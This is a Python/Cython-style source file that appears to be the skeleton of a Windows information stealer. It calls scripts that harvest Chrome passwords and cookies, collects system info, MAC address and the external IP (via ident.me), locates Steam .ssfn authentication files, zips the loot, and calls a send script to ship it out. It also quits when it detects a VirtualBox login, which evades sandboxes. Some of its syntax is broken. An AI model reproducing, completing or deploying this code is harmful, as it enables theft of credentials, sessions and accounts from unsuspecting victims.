# -*- coding: utf-8 -*-
"""
Created on Tue Jan 22 19:27:42 2019

@author: daniilshamraev
"""

import os, sys, re, zipfile

cdef main():
    if __name__ == "__main__":
        start()

cdef start():
    check_os()
    grubs()
    #zip_p()
    #sending()

cdef grubs():

    os.system("python chromium_pass.py")
    os.system("python cookies.py")
    sysinfo = os.popen("SYSTEMINFO").read().encode("cp1251").decode("cp866")
    fsinf = open("systeminfo.txt","a+")
    fsinf.write(sysinfo)
    
    import urllib.request
    external_ip = urllib.request.urlopen('http://ident.me').read().decode('utf8')
    fsinf.write("")
    fsinf.write("IP device: " + external_ip)
    fsinf.write("")
    getmac = os.popen("getmac").read().encode("cp1251").decode("cp866")
    fsinf.write("   MAC device: " + getmac)
    fsinf.close()
    
    steamdir = r"""C:\Program Files (x86)\Steam"""
    dirs_ssfn = []

    for root, dirs, files in os.walk(steamdir):
        for file in files:
                if file.endswith(".ssfn"):
                    dirs_ssfn.append(os.path.join(root, file))
    print(dirs_ssfn)
    
cdef zip_p():

    Zip = zipfile.ZipFile('logg.zip', 'w')
    Zip.write("db")
    Zip.write("logs.txt")
    Zip.write("systeminfo.txt")
    Zip.close()

cdef sending():

    os.system("python send.py")
    
    
cdef check_os():

    if sys.platform == "win32":

        string os = os.getlogin()
        parse = "VirtualBox"
        if re.findall(parse, os):
            sys.exit(0)
        del os, parse
        
main()
